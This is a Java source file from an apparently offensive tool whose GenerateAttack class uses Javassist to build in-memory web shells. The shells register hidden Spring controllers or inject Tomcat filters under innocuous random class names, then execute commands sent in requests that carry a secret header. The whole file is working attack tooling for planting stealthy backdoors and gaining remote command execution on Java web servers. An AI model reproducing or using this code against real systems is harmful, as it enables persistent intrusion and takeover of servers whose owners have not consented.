package com.generate;

import com.Main;
import com.dto.ClassDto;
import javassist.*;
import javassist.bytecode.AccessFlag;

import java.util.HashMap;

public class GenerateAttack {
    public static String basePath = Main.class.getProtectionDomain().getCodeSource().getLocation().getPath();
    static {
        if (Main.isDeveloper == true){
            basePath = basePath + "/jars";
        }else{
            basePath = basePath + "/../jars";
        }
    }
    public static ClassDto SpringRegisterHandler(String url, String cmd, String header, String headerValue) throws Exception {
        ClassPool classPool = new ClassPool();
        classPool.insertClassPath(basePath + "/javaxServlet/*");
        classPool.insertClassPath(basePath + "/springBoot/*");
        classPool.insertClassPath(basePath + "/jdk/*");

        String readablePackageName = Utils.getReadablePackageName("");
        String readableClassName = Utils.getReadableClassName("");
        String className = readablePackageName + readableClassName;
        CtClass springControllerCtClass = classPool.makeClass(className);
        CtConstructor springRegisterHandlerCtConstructor = springControllerCtClass.makeClassInitializer();
        String methodName = Utils.getReadableMethodName("");
        String methodBody = Utils.loadTempFile("/SpringRegisterHandler.temp");

        //generate method
        /*
        private static String className = "";
        private static String methodName = "";
        private static String url = "";
        * */
        methodBody = methodBody.replace("{{{className}}}", className);
        methodBody = methodBody.replace("{{{methodName}}}", methodName);
        methodBody = methodBody.replace("{{{url}}}", url);
        springRegisterHandlerCtConstructor.setBody(methodBody);

        //set springController
        /*
        *     public static String header = "";
            public static String headerValue = "";
            public static String cmd = "";
        * */
        HashMap<String, String> args = new HashMap<>();
        args.put("header", header);
        args.put("headerValue", headerValue);
        args.put("cmd", cmd);
        String methodDescirpt = "public void " + methodName + "(javax.servlet.http.HttpServletRequest request, javax.servlet.http.HttpServletResponse response);";
        GenerateServlet.generateCommandWebShell(springControllerCtClass, methodDescirpt, args);

        return new ClassDto(className, methodName, springControllerCtClass.toBytecode());
    }

    public static ClassDto springRegisterMapping(String url, String cmd, String header, String headerValue) throws Exception{
        ClassPool classPool = new ClassPool();
        classPool.insertClassPath(basePath + "/javaxServlet/*");
        classPool.insertClassPath(basePath + "/springBoot/*");
        classPool.insertClassPath(basePath + "/jdk/*");

        String readablePackageName = Utils.getReadablePackageName("");
        String readableClassName = Utils.getReadableClassName("");
        String className = readablePackageName + readableClassName;
        CtClass springControllerCtClass = classPool.makeClass(className);
        CtConstructor springRegisterHandlerCtConstructor = springControllerCtClass.makeClassInitializer();
        String methodName = Utils.getReadableMethodName("");
        String methodBody = Utils.loadTempFile("/SpringRegisterMapping.temp");

        //generate method
        /*
        private static String className = "";
        private static String methodName = "";
        private static String url = "";
        * */
        methodBody = methodBody.replace("{{{className}}}", className);
        methodBody = methodBody.replace("{{{methodName}}}", methodName);
        methodBody = methodBody.replace("{{{url}}}", url);

        springRegisterHandlerCtConstructor.setBody(methodBody);

        //set springController
        /*
        *     public static String header = "";
            public static String headerValue = "";
            public static String cmd = "";
        * */
        HashMap<String, String> args = new HashMap<>();
        args.put("header", header);
        args.put("headerValue", headerValue);
        args.put("cmd", cmd);
        String methodDescirpt = "public void " + methodName + "(javax.servlet.http.HttpServletRequest request, javax.servlet.http.HttpServletResponse response);";
        GenerateServlet.generateCommandWebShell(springControllerCtClass, methodDescirpt, args);

        return new ClassDto(className, methodName, springControllerCtClass.toBytecode());
    }

    public static ClassDto tomcatFilter(String url, String cmd, String header, String headerValue, String version) throws Exception{
        ClassPool classPool = new ClassPool();
        classPool.insertClassPath(basePath + "/tomcat/my/*");
        classPool.insertClassPath(basePath + "/jdk/*");

        String readablePackageName = Utils.getReadablePackageName("");
        String readableClassName = Utils.getReadableClassName("");
        String className = readablePackageName + readableClassName;
        CtClass tomcatFilterClass = classPool.makeClass(className);
        CtClass filterCtClass = classPool.get("javax.servlet.Filter");
        tomcatFilterClass.addInterface(filterCtClass);

        String methodBodyContext = "";
        String methodDescirpt = "";
        String methodBodyFilter = "";
        String methodNameContext = Utils.getReadableMethodName("");

        switch (version){
            //综合考虑6,7,8,9的情况，体积较大
            case "6789" :
                methodBodyContext = Utils.loadTempFile("/TomcatContextSByMBeanServer.temp");
                methodDescirpt = "public java.util.ArrayList " + methodNameContext + "();";
                methodBodyFilter = Utils.loadTempFile("/Tomcat6789FilterAdd.temp");
                break;
            //不需要考虑6,7的情况，体积更小
            case "89":
                methodBodyContext = Utils.loadTempFile("/TomcatContextByCurrentThread.temp");
                methodDescirpt = "public org.apache.catalina.core.StandardContext " + methodNameContext + "();";
                methodBodyFilter = Utils.loadTempFile("/Tomcat89FilterAdd.temp");
                break;
            case "10":
                break;
        }


        //generate get context method
        CtMethod contextMethodCtMethod = CtMethod.make(methodDescirpt, tomcatFilterClass);
        tomcatFilterClass.addMethod(contextMethodCtMethod);
        contextMethodCtMethod.setBody(methodBodyContext);
        contextMethodCtMethod.setModifiers(AccessFlag.STATIC);
        contextMethodCtMethod.getMethodInfo().rebuildStackMap(classPool);

        //inject filter to tomcat
        CtConstructor tomcatFilterCtConstructor = tomcatFilterClass.makeClassInitializer();
        methodBodyFilter = methodBodyFilter.replace("{{{className}}}", className);
        methodBodyFilter = methodBodyFilter.replace("{{{methodNameContext}}}", methodNameContext);
        methodBodyFilter = methodBodyFilter.replace("{{{url}}}", url);
        tomcatFilterCtConstructor.setBody(methodBodyFilter);
        tomcatFilterCtConstructor.getMethodInfo().rebuildStackMap(classPool);

        //setBody will modify ctClass to abstract
        //modify to non-abstract
        tomcatFilterClass.setModifiers(tomcatFilterClass.getModifiers() & ~Modifier.ABSTRACT);

        //doFilter() method
        //change method name
        String methodBody = Utils.loadTempFile("/BaseServlet.temp");
        HashMap<String, String> args = new HashMap<>();
        args.put("header", header);
        args.put("headerValue", headerValue);
        args.put("cmd", cmd);
        String methodDoFilterDescirpt = "public void doFilter(javax.servlet.ServletRequest request, javax.servlet.ServletResponse response, javax.servlet.FilterChain chain) throws java.io.IOException, javax.servlet.ServletException;";
        GenerateServlet.generateCommandWebShell(tomcatFilterClass, methodDoFilterDescirpt, args);

        //init() method
        String methodInitDescirpt = "public void init(javax.servlet.FilterConfig filterConfig) throws javax.servlet.ServletException;";
        CtMethod initMethodCtMethod = CtMethod.make(methodInitDescirpt, tomcatFilterClass);
        initMethodCtMethod.setBody(";");
        tomcatFilterClass.addMethod(initMethodCtMethod);

        return new ClassDto(className, "doFilter", tomcatFilterClass.toBytecode());
    }
}
